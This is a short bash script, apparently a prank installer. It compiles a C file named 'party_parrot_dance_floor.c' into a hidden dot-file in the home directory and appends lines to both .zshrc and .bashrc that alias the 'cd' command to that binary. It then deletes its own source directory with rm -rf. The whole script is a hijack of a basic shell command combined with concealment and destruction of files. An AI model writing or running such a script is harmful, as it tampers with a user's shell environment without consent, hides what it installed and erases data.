#!/bin/bash

gcc party_parrot_dance_floor.c -o .07_03_21_in_memory_of_the_Kesha
mv .07_03_21_in_memory_of_the_Kesha ~/.07_03_21_in_memory_of_the_Kesha

echo -en "alias cd=\"~/.07_03_21_in_memory_of_the_Kesha\"" >> ~/.zshrc
echo -en "alias cd=\"~/.07_03_21_in_memory_of_the_Kesha\"" >> ~/.bashrc
rm -rf ../party_parrot_dance_floor/
